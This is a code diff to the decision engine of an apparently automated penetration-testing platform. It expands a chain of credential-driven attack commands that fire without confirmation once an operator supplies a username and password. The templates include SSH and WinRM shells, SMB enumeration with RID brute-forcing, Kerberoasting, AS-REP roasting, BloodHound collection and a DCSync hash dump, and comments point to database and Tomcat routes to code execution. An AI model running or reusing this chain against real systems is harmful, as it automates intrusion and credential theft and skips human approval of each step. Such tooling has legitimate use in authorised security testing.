@@ -181,24 +181,26 @@ class DecisionEngine:
         """
         target = intel.get("target", "")
 
-        # ── Phase 0a: Credentialed-AD primer (HIGHEST priority) ────────────
-        # When operator notes contain valid AD credentials AND the target has
-        # AD-style ports open (445/5985/3389/389), fire the deterministic
-        # creds-in-hand chain ahead of everything else.  This is the single
-        # most-impactful primer: a 30-second path from `user:pass` to an
-        # interactive shell on a domain-joined Windows host.
-        ad_primer = self._next_credentialed_ad_primer(
+        # ── Phase 0a: Credentialed primer (HIGHEST priority) ─────────────
+        # When operator notes contain ANY user:pass credentials AND a
+        # service known to accept them is open, fire the deterministic
+        # creds-in-hand chain ahead of everything else.  Covers AD
+        # (SMB/WinRM/RDP/LDAP/Kerberos), Linux (SSH), databases (MySQL,
+        # Postgres, MSSQL, MongoDB, Redis, Elasticsearch), web auth
+        # (HTTP basic, Tomcat manager), and mail (SMTP).  The first step
+        # whose port is open and whose chain hasn't yet fired runs.
+        cred_primer = self._next_credentialed_primer(
             intel           = intel,
             target          = target,
             used_tools      = used_tools,
             negative_memory = negative_memory,
         )
-        if ad_primer is not None:
+        if cred_primer is not None:
             await self._emit_reasoning(
-                f"[ad-primer] credentialed AD step: {ad_primer.tool} "
-                f"→ {ad_primer.target_service} ({ad_primer.reason[:80]})"
+                f"[cred-primer] credentialed step: {cred_primer.tool} "
+                f"→ {cred_primer.target_service} ({cred_primer.reason[:80]})"
             )
-            return ad_primer
+            return cred_primer
 
         # ── Phase 0b (Recommendation E): Foothold primers force-promoted ────
         # If an open service has a registered cheap-unauth primer chain
@@ -544,81 +546,180 @@ class DecisionEngine:
         }
         return tool_service.get(tool, f"{tool}:{target}")
 
-    # ── Credentialed-AD primer (Windows post-creds chain) ────────────────
-    # When the operator pastes valid AD creds in `notes` / `scope`, we fire
-    # this deterministic chain ahead of any LLM planning.  The chain is
-    # ordered cheapest-to-shell so the platform reaches a real foothold in
-    # under a minute on most CTF/lab/internal-AD scenarios.
-    #
-    # Each entry produces a single command using the placeholders:
+    # ── Credentialed primer (operator-supplied creds chain) ──────────────
+    # When the operator pastes credentials in `notes` / `scope` we fire
+    # this deterministic chain ahead of any LLM planning.  Each entry
+    # produces a single command using the placeholders:
     #   {target}, {user}, {pass}, {domain}, {dc_ip}, {base_dn}
-    # The domain / base_dn are looked up from intel and fall back to the
-    # short-circuit "unknown" so the LLM can repair them in next iteration.
-    _CRED_AD_PRIMERS: List[Dict[str, Any]] = [
-        # 1. Validate creds via SMB (always step #1 — confirms cred + DC reachable)
+    # Steps that need {domain}/{base_dn} skip themselves until those
+    # values are populated by recon (rdp-ntlm-info, ldap rootDSE, etc.) —
+    # so a Linux SSH-only box never tries to kerberoast.
+    #
+    # Coverage matrix (port → handler):
+    #   22         SSH login
+    #   21         FTP login
+    #   25/587     SMTP AUTH
+    #   88         Kerberoast / AS-REP roast      (AD)
+    #   389        LDAP simple bind / BloodHound  (AD)
+    #   445        SMB validate / enum / DCSync   (AD)
+    #   1433       MSSQL login (Windows-auth)     (AD-friendly)
+    #   3306       MySQL login
+    #   3389       RDP login                      (AD-friendly)
+    #   5432       PostgreSQL login
+    #   5985       WinRM check + evil-winrm       (AD)
+    #   6379       Redis AUTH
+    #   8080/8443  HTTP basic / Tomcat manager
+    #   9200       Elasticsearch
+    #   27017      MongoDB
+    #
+    # Order matters for boxes where multiple services accept the same
+    # creds — we list the cheapest-to-shell paths first (SSH, evil-winrm)
+    # so the platform lands a foothold ASAP.
+    _CRED_PRIMERS: List[Dict[str, Any]] = [
+        # ── SSH (Linux/Unix path to shell) ────────────────────────────
+        # Single non-interactive command that proves auth + dumps host
+        # info.  `id` output (`uid=N(...)`) trips register_shell's real-
+        # foothold regex so the post-ex / privesc gate flips correctly.
+        {"chain": "ssh_creds_login", "ports": ["22"],
+         "tool": "sshpass",
+         "args": "-p '{pass}' ssh -o StrictHostKeyChecking=no -o BatchMode=no -o ConnectTimeout=10 -o PreferredAuthentications=password -o PubkeyAuthentication=no {user}@{target} 'id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null'",
+         "service_label": "ssh:22",
+         "rationale": "SSH login with creds — produces uid= evidence, instant Linux foothold"},
+        # ── AD: SMB cred validation ───────────────────────────────────
         {"chain": "ad_creds_validate_smb", "ports": ["445"],
          "tool": "crackmapexec",
          "args": "smb {target} -u '{user}' -p '{pass}'",
          "service_label": "smb:445",
-         "rationale": "validate provided AD credentials before any heavier action"},
-        # 2. Enumerate shares + users + groups + pass policy
+         "rationale": "validate AD credentials before heavier action"},
+        # ── AD: SMB enumeration ───────────────────────────────────────
         {"chain": "ad_creds_enum_smb", "ports": ["445"],
          "tool": "crackmapexec",
          "args": "smb {target} -u '{user}' -p '{pass}' --shares --users --groups --pass-pol --rid-brute 4000",
          "service_label": "smb:445",
          "rationale": "enumerate AD with creds — shares, users, groups, RID brute"},
-        # 3. Check WinRM access (5985 → likely instant shell)
+        # ── AD: WinRM check (likely Pwn3d!) ───────────────────────────
         {"chain": "ad_creds_winrm_check", "ports": ["5985"],
          "tool": "crackmapexec",
          "args": "winrm {target} -u '{user}' -p '{pass}'",
          "service_label": "winrm:5985",
          "rationale": "check WinRM — `Pwn3d!` line means evil-winrm gives instant shell"},
-        # 4. evil-winrm interactive shell (when WinRM open)
-        # NOTE: this command runs in interactive mode; the executor wraps it
-        # with a timeout/script.  When success regex hits, register_shell()
-        # fires.
+        # ── AD: evil-winrm interactive shell ──────────────────────────
         {"chain": "ad_creds_winrm_shell", "ports": ["5985"],
          "tool": "evil-winrm",
          "args": "-i {target} -u '{user}' -p '{pass}'",
          "service_label": "winrm:5985",
          "rationale": "WinRM interactive shell with valid creds — direct foothold"},
-        # 5. Kerberoasting (collect TGS hashes for offline cracking)
+        # ── AD: Kerberoasting ─────────────────────────────────────────
         {"chain": "ad_creds_kerberoast", "ports": ["88"],
          "tool": "impacket-GetUserSPNs",
          "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/kerberoast.{target}.txt",
          "service_label": "kerberos:88",
          "rationale": "kerberoast — request TGS for service accounts, crack offline"},
-        # 6. AS-REP roasting (no-preauth users)
+        # ── AD: AS-REP roasting ───────────────────────────────────────
         {"chain": "ad_creds_asreproast", "ports": ["88"],
          "tool": "impacket-GetNPUsers",
          "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/asreproast.{target}.txt",
          "service_label": "kerberos:88",
          "rationale": "AS-REP roast — find users with DONT_REQ_PREAUTH"},
-        # 7. LDAP search with correct base DN (fixes the j.arbuckle/j.arbuckle bug)
-        {"chain": "ad_creds_ldap_userinfo", "ports": ["389"],
+        # ── LDAP simple bind (works on AD and standalone OpenLDAP) ────
+        # Skipped if {domain} / {base_dn} unfilled.
+        {"chain": "ldap_simple_bind_userinfo", "ports": ["389"],
          "tool": "ldapsearch",
          "args": "-H ldap://{target} -x -D '{user}@{domain}' -w '{pass}' -b '{base_dn}' '(sAMAccountName={user})'",
          "service_label": "ldap:389",
-         "rationale": "fetch caller's AD object — group membership, ACL targets"},
-        # 8. Full BloodHound collection
+         "rationale": "fetch caller's directory object — group membership, ACL targets"},
+        # ── AD: BloodHound collection ─────────────────────────────────
         {"chain": "ad_creds_bloodhound", "ports": ["389"],
          "tool": "bloodhound-python",
          "args": "-d {domain} -u '{user}' -p '{pass}' -ns {target} -c All --zip",
          "service_label": "ldap:389",
          "rationale": "full AD attack-graph collection for offline path analysis"},
-        # 9. RDP try (3389 — many lab boxes accept the same creds)
+        # ── AD: RDP try ───────────────────────────────────────────────
         {"chain": "ad_creds_rdp_try", "ports": ["3389"],
          "tool": "xfreerdp",
          "args": "/v:{target} /u:{user} /p:'{pass}' /cert:ignore /size:1024x768 +clipboard",
          "service_label": "rdp:3389",
          "rationale": "RDP with valid creds — interactive Windows desktop session"},
-        # 10. SecretsDump (DCSync if user has rights — last because heaviest)
+        # ── AD: SecretsDump (DCSync) ──────────────────────────────────
         {"chain": "ad_creds_secretsdump_try", "ports": ["445"],
          "tool": "impacket-secretsdump",
          "args": "{domain}/{user}:'{pass}'@{target} -just-dc-ntlm",
          "service_label": "smb:445",
-         "rationale": "DCSync attempt — gives every NT hash if user has GetChanges rights"},
+         "rationale": "DCSync — gives every NT hash if user has GetChanges rights"},
+
+        # ── Database services ─────────────────────────────────────────
+        # MSSQL — Windows auth path; common AD lateral escalation.
+        {"chain": "mssql_creds_login", "ports": ["1433"],
+         "tool": "impacket-mssqlclient",
+         "args": "{user}:'{pass}'@{target} -windows-auth",
+         "service_label": "mssql:1433",
+         "rationale": "MSSQL Windows-auth — xp_cmdshell often gives RCE on misconfigured boxes"},
+        # MySQL — list databases proves cred validity.
+        {"chain": "mysql_creds_login", "ports": ["3306"],
+         "tool": "mysql",
+         "args": "-h {target} -u {user} -p'{pass}' -e 'SELECT user(), version(); SHOW DATABASES;'",
+         "service_label": "mysql:3306",
+         "rationale": "MySQL with creds — version + DB list, sometimes UDF→RCE path"},
+        # PostgreSQL — connection-string variant avoids PGPASSWORD env handling.
+        {"chain": "postgres_creds_login", "ports": ["5432"],
+         "tool": "psql",
+         "args": "'postgresql://{user}:{pass}@{target}:5432/postgres' -c '\\l'",
+         "service_label": "postgresql:5432",
+         "rationale": "PostgreSQL with creds — list DBs, COPY ... PROGRAM = RCE on >= 9.3"},
+        # MongoDB — auth + DB list.
+        {"chain": "mongodb_creds_login", "ports": ["27017"],
+         "tool": "mongosh",
+         "args": "--host {target} -u {user} -p '{pass}' --authenticationDatabase admin --eval 'db.adminCommand({{listDatabases:1}})'",
+         "service_label": "mongodb:27017",
+         "rationale": "MongoDB with creds — list DBs, server roles for privesc"},
+        # Redis — AUTH check (no user, password-only on legacy servers).
+        {"chain": "redis_creds_auth", "ports": ["6379"],
+         "tool": "redis-cli",
+         "args": "-h {target} -a '{pass}' INFO server",
+         "service_label": "redis:6379",
+         "rationale": "Redis AUTH — server info, then write-key foothold path"},
+        # Elasticsearch — basic auth.
+        {"chain": "elastic_creds_check", "ports": ["9200"],
+         "tool": "curl",
+         "args": "-s -u '{user}:{pass}' http://{target}:9200/_cat/indices?v",
+         "service_label": "elasticsearch:9200",
+         "rationale": "Elasticsearch basic-auth — list indices, possible info leak"},
+
+        # ── FTP ───────────────────────────────────────────────────────
+        {"chain": "ftp_creds_login", "ports": ["21"],
+         "tool": "curl",
+         "args": "-u '{user}:{pass}' --connect-timeout 15 ftp://{target}/ -s -o /dev/null -w 'http_code=%{{http_code}} ftp_user={user}\\n'",
+         "service_label": "ftp:21",
+         "rationale": "FTP login check — validates creds, lists root"},
+
+        # ── SMTP AUTH (relay / spoofing prerequisite) ─────────────────
+        {"chain": "smtp_creds_authcheck", "ports": ["25", "587"],
+         "tool": "swaks",
+         "args": "--server {target} --auth-user {user} --auth-password '{pass}' --quit-after AUTH",
+         "service_label": "smtp:25",
+         "rationale": "SMTP AUTH check — validates creds for relay / spoofing"},
+
+        # ── HTTP basic auth (sometimes serves admin panels) ───────────
+        {"chain": "http_basic_creds_check", "ports": ["80", "8080"],
+         "tool": "curl",
+         "args": "-s -o /dev/null -w 'http=%{{http_code}} url=%{{url_effective}}\\n' --connect-timeout 15 -u '{user}:{pass}' http://{target}/",
+         "service_label": "http:80",
+         "rationale": "HTTP basic-auth check — validates creds against root URL"},
+        {"chain": "https_basic_creds_check", "ports": ["443", "8443"],
+         "tool": "curl",
+         "args": "-sk -o /dev/null -w 'http=%{{http_code}} url=%{{url_effective}}\\n' --connect-timeout 15 -u '{user}:{pass}' https://{target}/",
+         "service_label": "https:443",
+         "rationale": "HTTPS basic-auth check"},
+        # ── Tomcat manager (creds → WAR upload → RCE) ─────────────────
+        {"chain": "tomcat_manager_creds", "ports": ["8080", "8443"],
+         "tool": "curl",
+         "args": "-s -u '{user}:{pass}' --connect-timeout 15 http://{target}:8080/manager/text/list",
+         "service_label": "tomcat:8080",
+         "rationale": "Tomcat manager check — creds work? then WAR upload → RCE"},
     ]
+    # Backwards-compat alias: older code paths may still reference the
+    # original AD-only name.  Keep the symbol so nothing imports break.
+    _CRED_AD_PRIMERS = _CRED_PRIMERS
 
     # Regex set for credential extraction from operator_notes free text.
     # Compiled lazily.
@@ -812,18 +913,26 @@ class DecisionEngine:
         parts = [p for p in domain.split(".") if p]
         return ",".join(f"DC={p}" for p in parts)
 
-    def _next_credentialed_ad_primer(
+    def _next_credentialed_primer(
         self,
         *, intel:           dict,
         target:             str,
         used_tools:         Dict[str, int],
         negative_memory:    NegativeMemory,
     ) -> Optional[JustifiedAction]:
-        """Return the next credentialed-AD primer step that has not yet
-        fired and whose required port is open.  None when:
+        """Return the next credentialed primer step that has not yet
+        fired and whose required port is open.  Works for any service
+        type — SSH, AD (SMB/WinRM/RDP/LDAP/Kerberos), databases (MySQL,
+        Postgres, MSSQL, MongoDB, Redis, Elasticsearch), web auth, SMTP.
+
+        Returns None when:
           - no creds in operator_notes, OR
-          - none of the AD primer ports are open, OR
+          - none of the primer ports are open on the target, OR
           - every applicable primer step has already fired this session.
+
+        AD-specific steps that need {domain} / {base_dn} skip themselves
+        when those values are unfilled — so a Linux SSH-only target
+        never tries to kerberoast.
         """
         creds = self._extract_credentials(intel)
         if not creds:
@@ -842,28 +951,40 @@ class DecisionEngine:
         if not open_ports:
             return None
 
-        # Resolve domain (and re-stamp creds.domain so subsequent steps reuse it)
+        # Resolve domain (only meaningful for AD steps; harmless for others).
         domain = creds.get("domain") or self._resolve_ad_domain(intel)
         if domain and not creds.get("domain"):
             creds["domain"] = domain
         base_dn = self._domain_to_base_dn(domain)
 
         # Track fired per-session
-        fired = intel.setdefault("_cred_ad_primers_fired", set())
+        fired = intel.setdefault("_cred_primers_fired", set())
         if isinstance(fired, list):
             fired = set(fired)
-            intel["_cred_ad_primers_fired"] = fired
+            intel["_cred_primers_fired"] = fired
 
         # Stash the parsed creds on intel so other components (extractors,
-        # post-ex agents) can read them without re-parsing notes.
+        # post-ex agents) can read them without re-parsing notes.  Two
+        # locations: ad{} for AD-aware code, credentials[] for generic
+        # consumers (web, db, ssh subagents).
         intel.setdefault("ad", {}).update({
             "user":     creds.get("user", ""),
             "password": creds.get("pass", ""),
             "dns_domain": domain,
             "base_dn":  base_dn,
         })
+        cred_list = intel.setdefault("credentials", [])
+        if isinstance(cred_list, list):
+            entry = {
+                "user":     creds.get("user", ""),
+                "password": creds.get("pass", ""),
+                "domain":   domain,
+                "source":   "operator_notes",
+            }
+            if entry not in cred_list:
+                cred_list.append(entry)
 
-        for primer in self._CRED_AD_PRIMERS:
+        for primer in self._CRED_PRIMERS:
             # Need at least one of the listed ports open
             if not (set(primer["ports"]) & open_ports):
                 continue
@@ -873,10 +994,10 @@ class DecisionEngine:
             tool = primer["tool"]
             svc  = primer["service_label"]
 
-            # Skip if domain-required step but we couldn't resolve a domain.
-            # The args template uses {domain} and {base_dn} — if they're
-            # blank the command would be malformed; defer until a future
-            # iteration when domain has been discovered.
+            # Skip if a placeholder needed by this primer is unfilled.
+            # {domain} and {base_dn} are AD-only; defer them until recon
+            # has populated the domain.  Everything else (target/user/
+            # pass/dc_ip) is always available when creds were extracted.
             if "{domain}" in primer["args"] and not domain:
                 continue
             if "{base_dn}" in primer["args"] and not base_dn:
@@ -903,28 +1024,35 @@ class DecisionEngine:
             fired.add(primer_key)
 
             return JustifiedAction(
-                action_id            = f"ad-primer-{primer_key}",
+                action_id            = f"cred-primer-{primer_key}",
                 tool                 = tool,
                 args                 = args_filled,
                 target_service       = svc,
                 reason               = (
-                    f"[AD-Primer/{primer_key}] credentialed AD step — "
+                    f"[Cred-Primer/{primer_key}] credentialed step — "
                     f"{primer['rationale']}"
                 ),
                 expected_outcome = (
-                    "Successful authentication / shell / hash dump — "
+                    "Successful authentication / shell / data listing — "
                     "or definitive 'access denied' to flag this primer dead."
                 ),
                 success_criteria = (
-                    "Tool exits 0 with `+` / `Pwn3d!` / non-empty hash output. "
-                    "On WinRM, `evil-winrm` reaching the prompt is a foothold."
+                    "Tool exits 0 with non-error output. "
+                    "Shell-producing tools (sshpass+ssh, evil-winrm, "
+                    "impacket-mssqlclient via xp_cmdshell) trigger a real "
+                    "register_shell when the output contains uid= / Pwn3d! / "
+                    "session-opened evidence."
                 ),
-                hypothesis_id        = "ad-primer",
+                hypothesis_id        = "cred-primer",
                 confidence           = 0.92,
                 requires_confirmation= False,
             )
 
         return None
+
+    # Backwards-compat alias — older callers may still reference the
+    # original AD-only name; keep the symbol callable.
+    _next_credentialed_ad_primer = _next_credentialed_primer
 
     # ── Recommendation E: foothold-primer auto-promotion ──────────────────
 
